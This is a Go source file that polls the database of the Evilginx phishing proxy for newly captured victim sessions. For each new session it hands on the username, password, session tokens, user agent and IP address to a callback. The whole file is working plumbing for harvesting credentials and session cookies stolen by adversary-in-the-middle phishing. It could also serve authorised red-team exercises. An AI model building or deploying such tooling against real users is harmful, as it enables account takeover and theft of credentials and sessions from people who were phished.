package evilginx

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"time"

	bolt "go.etcd.io/bbolt"
)

// CapturedSession represents a session captured by Evilginx
type CapturedSession struct {
	ID         string            `json:"id"`
	Phishlet   string            `json:"phishlet"`
	Username   string            `json:"username"`
	Password   string            `json:"password"`
	Tokens     map[string]string `json:"tokens"`
	UserAgent  string            `json:"useragent"`
	RemoteAddr string            `json:"remote_addr"`
	CreateTime int64             `json:"create_time"`
	UpdateTime int64             `json:"update_time"`
}

// SessionCallback is called when new sessions are found
type SessionCallback func(session CapturedSession)

// SessionPoller polls the Evilginx bbolt database for new captured sessions
type SessionPoller struct {
	dbPath   string
	interval time.Duration
	callback SessionCallback
	lastSeen map[string]bool
}

func NewSessionPoller(dbPath string, interval time.Duration, callback SessionCallback) *SessionPoller {
	return &SessionPoller{
		dbPath:   dbPath,
		interval: interval,
		callback: callback,
		lastSeen: make(map[string]bool),
	}
}

// Start begins polling in a goroutine. Cancel the context to stop.
func (p *SessionPoller) Start(ctx context.Context) {
	go func() {
		ticker := time.NewTicker(p.interval)
		defer ticker.Stop()

		// Initial poll
		p.poll()

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				p.poll()
			}
		}
	}()
}

func (p *SessionPoller) poll() {
	sessions, err := p.readSessions()
	if err != nil {
		log.Printf("[poller] error reading evilginx sessions: %v", err)
		return
	}

	for _, s := range sessions {
		if !p.lastSeen[s.ID] {
			p.lastSeen[s.ID] = true
			p.callback(s)
		}
	}
}

func (p *SessionPoller) readSessions() ([]CapturedSession, error) {
	db, err := bolt.Open(p.dbPath, 0600, &bolt.Options{
		ReadOnly: true,
		Timeout:  2 * time.Second,
	})
	if err != nil {
		return nil, fmt.Errorf("opening bbolt db at %s: %w", p.dbPath, err)
	}
	defer db.Close()

	var sessions []CapturedSession

	err = db.View(func(tx *bolt.Tx) error {
		b := tx.Bucket([]byte("sessions"))
		if b == nil {
			return nil // No sessions bucket yet
		}

		return b.ForEach(func(k, v []byte) error {
			var s CapturedSession
			if err := json.Unmarshal(v, &s); err != nil {
				// Try to extract what we can from the raw data
				log.Printf("[poller] warning: could not parse session %s: %v", string(k), err)
				return nil
			}
			if s.ID == "" {
				s.ID = string(k)
			}
			sessions = append(sessions, s)
			return nil
		})
	})

	return sessions, err
}
